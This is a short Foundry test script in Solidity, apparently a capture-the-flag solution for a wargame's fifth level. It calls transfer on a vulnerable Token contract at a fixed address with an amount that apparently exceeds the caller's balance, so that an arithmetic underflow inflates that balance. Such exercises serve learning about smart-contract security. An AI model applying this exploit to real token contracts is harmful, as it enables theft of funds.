// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../instances/Ilevel05.sol";

contract POC is Test {
    Token level5 = Token(0x64db54633180E5C63Ca63393324a8E0843dFa485);

    function test() external {
        vm.startBroadcast();
        
        console.log("Current balance is :", level5.balanceOf(msg.sender));
        level5.transfer(0xEAce4b71CA1A128e8B562561f46896D55B9B0246, 21);
        console.log("New balance is :", level5.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}